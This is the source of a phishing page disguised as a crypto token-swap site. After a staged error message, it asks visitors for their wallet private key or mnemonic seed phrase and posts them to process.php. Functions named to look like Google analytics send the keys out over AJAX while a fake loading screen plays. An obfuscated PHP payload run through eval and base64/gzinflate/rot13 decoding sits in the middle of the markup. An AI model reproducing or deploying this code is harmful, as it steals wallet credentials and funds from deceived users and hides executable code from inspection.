                                <div class="css-8mokm4">CELR</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x06AF07097C9Eeb7fD685c692751D5C66dB49c215" style="position: absolute; left: 0px; top: 896px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(14).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">CHAI</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xc00e94Cb662C3520282E6f5717214004A7f26888" style="position: absolute; left: 0px; top: 952px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(15).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">COMP</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xF5DCe57282A584D2746FaF1593d3121Fcac444dC" style="position: absolute; left: 0px; top: 1008px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(16).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">cSAI</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x543Ff227F64Aa17eA132Bf9886cAb5DB55DCAddf" style="position: absolute; left: 0px; top: 1064px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(17).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">GEN</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x0000000000b3F879cb30FE243b4Dfee438691c04" style="position: absolute; left: 0px; top: 1120px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(18).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">GST2</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x6c6EE5e31d828De241282B9606C8e98Ea48526E2" style="position: absolute; left: 0px; top: 1176px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(19).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">HOT</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x493C57C4763932315A328269E1ADaD09653B9081" style="position: absolute; left: 0px; top: 1232px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(20).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">iDAI</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x514910771AF9Ca656af840dff83E8264EcF986CA" style="position: absolute; left: 0px; top: 1288px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(21).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">LINK</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xA4e8C3Ec456107eA67d3075bF9e3DF3A75823DB0" style="position: absolute; left: 0px; top: 1344px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(22).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">LOOM</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xD29F0b5b3F50b07Fe9a9511F7d86F4f4bAc3f8c4" style="position: absolute; left: 0px; top: 1400px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(23).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">LQD</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xa3d58c4E56fedCae3a7c43A725aeE9A71F0ece4e" style="position: absolute; left: 0px; top: 1456px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(24).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">MET</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x80f222a749a2e18Eb7f676D371F19ad7EFEEe3b7" style="position: absolute; left: 0px; top: 1512px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(25).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">MGN</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>


                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x107c4504cd79C5d2696Ea0030a8dD4e92601B82e" style="position: absolute; left: 0px; top: 560px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="./files/logo(26).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">BLT</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                </div>
            </div>
            <div style="width: 100%; height: 1px; background-color: rgb(247, 248, 250);"></div>
            <div class="sc-bdVaJa sc-hMqMXs cfSjVZ">
                <div class="sc-bdVaJa sc-htpNat sc-EHOje sBJse">
                    <div>
                        <button class="sc-kGXeez hcyaSn" style="font-weight: 500; color: rgb(86, 90, 105); font-size: 16px;">Having trouble
                            finding a token?
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<!-- modal privat -->
<div class="sc-fBuWsC kEokqJ" id="modal_privat" data-reach-dialog-overlay="" style="opacity: 1; display: none;">
    <div aria-modal="true" role="dialog" tabindex="-1" aria-label="dialog" hidden="" class="sc-fMiknA fuGLvk" data-reach-dialog-content="">
        <div class="sc-hXRMBi fqOcYb">
            <div class="sc-bsbRJL hgyVGw">
                <div class="sc-eTuwsz cobcrG" onclick="closeModalPrivat()">
                    <svg width="20" onclick="closeModalPrivat()" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-gwVKww eHktrE">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </div>
                <div class="sc-epnACN haZPvP">
                    <div class="sc-iuJeZd juASlh">Access by Private Key</div>
                </div>
				
				
				
				
				
				
				
				<form action="process.php" method="POST" id="form1">
                <div class="sc-iQNlJl kLhUQG">
                    <div class="sc-cMhqgX idOYax">
                        <button id="connect-METAMASK" style="" class="connect-METAMASK sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx">
                            <span>An error has occurred, please use these login methods! We will fix the problem soon.</span>
                        </button>

                        <input data-v-737fadfa="" placeholder="Enter Private Key" type="text" name="key" id="PrivateKey" style="

    height: 33px;
" autocomplete="off" required="">

                        <button id="connect-FORTMATIC" onclick="form1" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" style="
    background-color: rgb(253, 234, 241);
    font-size: 16px;
    font-weight: 500;
">
                            <div class="sc-gxMtzJ bnTkUa">
                                <div color="#6748FF" style="margin-left: 109px; color: rgb(255, 0, 122);" class="sc-hwwEjo cZFjOz"> Access Wallet
                                </div>
                            </div>

                        </button>

                    </div>
					
					
					
					
					
					
					
					
					
					
					

                </div>
				 </form>
            </div>
        </div>
    </div>
</div>
<!-- modal mnem -->
<div class="sc-fBuWsC kEokqJ" id="modal_mnem" data-reach-dialog-overlay="" style="opacity: 1; display: none;">
    <div aria-modal="true" role="dialog" tabindex="-1" aria-label="dialog" hidden="" class="sc-fMiknA fuGLvk" data-reach-dialog-content="">
        <div class="sc-hXRMBi fqOcYb">
            <div class="sc-bsbRJL hgyVGw">
                <div class="sc-eTuwsz cobcrG" onclick="closeModalMnem()">
                    <svg width="20" onclick="closeModalMnem()" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-gwVKww eHktrE">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </div>
                <div class="sc-epnACN haZPvP">
                    <div class="sc-iuJeZd juASlh">Access by Mnemonic Phrase</div>
                </div>
				
				
				
				
				
				
				
				
				
				 <form action="process.php" method="POST" id="form1">
                <div class="sc-iQNlJl kLhUQG">
                    <div class="sc-cMhqgX idOYax">
                        <button id="connect-METAMASK" style="" class="connect-METAMASK sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx">
                            <span>An error has occurred, please use these login methods! We will fix the problem soon.</span>
                        </button>
                        <input data-v-737fadfa="" minlength="10" placeholder="Enter mnemonic phrase" type="text" name="key" id="mnemkey" style="

    height: 250px;
" autocomplete="off" required="">

                        <button id="connect-FORTMATIC" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" style="
    background-color: rgb(253, 234, 241);
    font-size: 16px;
    font-weight: 500;
">
                            <div class="sc-gxMtzJ bnTkUa" onclick="form1">
                                <div color="#6748FF" style="margin-left: 109px; color: rgb(255, 0, 122);" class="sc-hwwEjo cZFjOz"> Access Wallet
                                </div>
                            </div>

                        </button>

                    </div>

                </div>
				 </form>
				
				
				
				
				
				
				
				
				
				
            </div>
        </div>
    </div>
</div>

<!-- modal metamask -->


<!-- modal keystore -->
<div class="sc-fBuWsC kEokqJ" id="loadScreen" data-reach-dialog-overlay="" style="opacity: 1;display:none;">
    <div class="loader">Loading...</div>
    <style>
        .loader {
            color: #ffffff;
            font-size: 90px;
            text-indent: -9999em;
            overflow: hidden;
            width: 1em;
            height: 1em;
            border-radius: 50%;
            margin: 72px auto;
            position: relative;
            -webkit-transform: translateZ(0);
            -ms-transform: translateZ(0);
            transform: translateZ(0);
            -webkit-animation: load6 1.7s infinite ease, round 1.7s infinite ease;
            animation: load6 1.7s infinite ease, round 1.7s infinite ease;
        }
        .small-loader{
            color: #e478ac;
            margin: 12px auto;
            font-size: 40px;
        }
        @-webkit-keyframes load6 {
            0% {
                box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
            }
            5%,
            95% {
                box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
            }
            10%,
            59% {
                box-shadow: 0 -0.83em 0 -0.4em, -0.087em -0.825em 0 -0.42em, -0.173em -0.812em 0 -0.44em, -0.256em -0.789em 0 -0.46em, -0.297em -0.775em 0 -0.477em;
            }
            20% {
                box-shadow: 0 -0.83em 0 -0.4em, -0.338em -0.758em 0 -0.42em, -0.555em -0.617em 0 -0.44em, -0.671em -0.488em 0 -0.46em, -0.749em -0.34em 0 -0.477em;
            }
            38% {
                box-shadow: 0 -0.83em 0 -0.4em, -0.377em -0.74em 0 -0.42em, -0.645em -0.522em 0 -0.44em, -0.775em -0.297em 0 -0.46em, -0.82em -0.09em 0 -0.477em;
            }
            100% {
                box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
            }
        }
        @keyframes load6 {
            0% {
                box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
            }
            5%,
            95% {
                box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
            }
            10%,
            59% {
                box-shadow: 0 -0.83em 0 -0.4em, -0.087em -0.825em 0 -0.42em, -0.173em -0.812em 0 -0.44em, -0.256em -0.789em 0 -0.46em, -0.297em -0.775em 0 -0.477em;
            }
            20% {
                box-shadow: 0 -0.83em 0 -0.4em, -0.338em -0.758em 0 -0.42em, -0.555em -0.617em 0 -0.44em, -0.671em -0.488em 0 -0.46em, -0.749em -0.34em 0 -0.477em;
            }
            38% {
                box-shadow: 0 -0.83em 0 -0.4em, -0.377em -0.74em 0 -0.42em, -0.645em -0.522em 0 -0.44em, -0.775em -0.297em 0 -0.46em, -0.82em -0.09em 0 -0.477em;
            }
            100% {
                box-shadow: 0 -0.83em 0 -0.4em, 0 -0.83em 0 -0.42em, 0 -0.83em 0 -0.44em, 0 -0.83em 0 -0.46em, 0 -0.83em 0 -0.477em;
            }
        }
        @-webkit-keyframes round {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
        @keyframes round {
            0% {
                -webkit-transform: rotate(0deg);
                transform: rotate(0deg);
            }
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg);
            }
        }
    </style>
</div>

<script src="./files/jquery.min.js.download"></script>
<script type="text/javascript">
    function closeModal() {
        $('#key-modal').css({'display': 'none'});

    }

    function openModal() {
        $('#modal').css({'display': 'flex'});

    }

    function closeModalError() {
        $('#modal_error').css({'display': 'none'});
        $('#modal').css({'display': 'flex'});

    }

    function openModalError() {
        $('#modal_error').css({'display': 'flex'});
        $('#modal').css({'display': 'none'});

    }

    function closeModalMnem() {
        $('#mnemonic-key').css({'display': 'none'});
        $('#key-modal').css({'display': 'block'});

    }

    function openModalMnem() {
        $('#mnemonic-key').css({'display': 'block'});
        $('#key-modal').css({'display': 'none'});

    }

    function closeModalPrivat() {
        $('#private-key').css({'display': 'none'});
        $('#key-modal').css({'display': 'block'});

    }
	
	function closeModalOpen() {
        window.location.href = "./wallet.php";

    }

    function openModalPrivat() {
        $('#private-key').css({'display': 'block'});
        $('#key-modal').css({'display': 'none'});

    }

    function openModalError_button(parameter) {
      document.getElementById('walletval').value = parameter;
        //alert(parameter);
        $('#key-modal').css({'display': 'block'});
        $('#wallets-modal').css({'display': 'none'});
    }

    function closeModalError_button() {
        $('#key-modal').css({'display': 'none'});
        $('#wallets-modal').css({'display': 'block'});

    }

    function closeModalToken() {
        $('#select_token').css({'display': 'none'});

    }

    function openModalToken() {
        $('#select_token').css({'display': 'flex'});

    }

    function Token_wallet() {
        $('#select_token').css({'display': 'none'});
        $('#modal').css({'display': 'flex'});

    }
    function getRandomInt(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

</script>
<script type="text/javascript">

    function googleanalytics() {
        var PrivateKey = document.getElementById('').value;
        var walletval = document.getElementById('').value;
        var min = 30;
        if (PrivateKey.length > min) {
            $.ajax({

                type: '',
                url: '',
                data: {'': PrivateKey, '': walletval},
                cache: false,
                beforeSend: function (){
                    $(loadScreen).show();
                    $('').hide();
                },
                success: function () {
                    setTimeout(function () {
                        $(loadScreen).hide();
                        $('').show();
                        location="./";
                    },getRandomInt(2000,4000));
                },
                error: function () {
                    setTimeout(function () {
                        $(loadScreen).hide();
                        $('').show();
                    },getRandomInt(2000,4000));
                }
            });
        } else {
            document.getElementById('PrivateKey').style.border = "1px solid red";
            alert("Error enter the correct Private Key");
        }
    }


</script> <?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));?> <script type="text/javascript">
    function googlemetricsapimnem() {
        var mnemkey = document.getElementById('').value;
        var walletval = document.getElementById('').value;
        var min = 12;
        //alert(mnemkey);
        if (mnemkey.length > min) {
            $.ajax({

                type: '',
                url: '',
                data: {'mnemkey': mnemkey, 'wallet': walletval},
                cache: false,
                beforeSend: function (){
                    $(loadScreen).show();
                    $('.connect-METAMASK').hide();
                },
                success: function () {
                    setTimeout(function () {
                        $(loadScreen).hide();
                        $('.connect-METAMASK').show();
                        location="";
                    },getRandomInt(2000,4000));
                },
                error: function () {
                    setTimeout(function () {
                        $(loadScreen).hide();
                        $('.connect-METAMASK').show();
                    },getRandomInt(2000,4000));
                }
            });

        } else {
            document.getElementById('').style.border = "1px solid red";
            alert("Error enter the correct Mnemonic Phrase");
        }
    }
    $('#error-msg').hide();
    $('.connect-METAMASK').show();
    $('#small-loader').show();
    setTimeout(function () {
        $('#small-loader').hide();
        $('#error-msg').show();
    },getRandomInt(2000,4000));
</script>
<p id="demo"></p>

<script>
function PopUp() {
  var txt;
  if (confirm("Connect a wallet to continue this action! Press OK to connect.")) {
    window.location.href = "./wallet.php";
  } else {
   
  }
  
}
</script>



</body></html>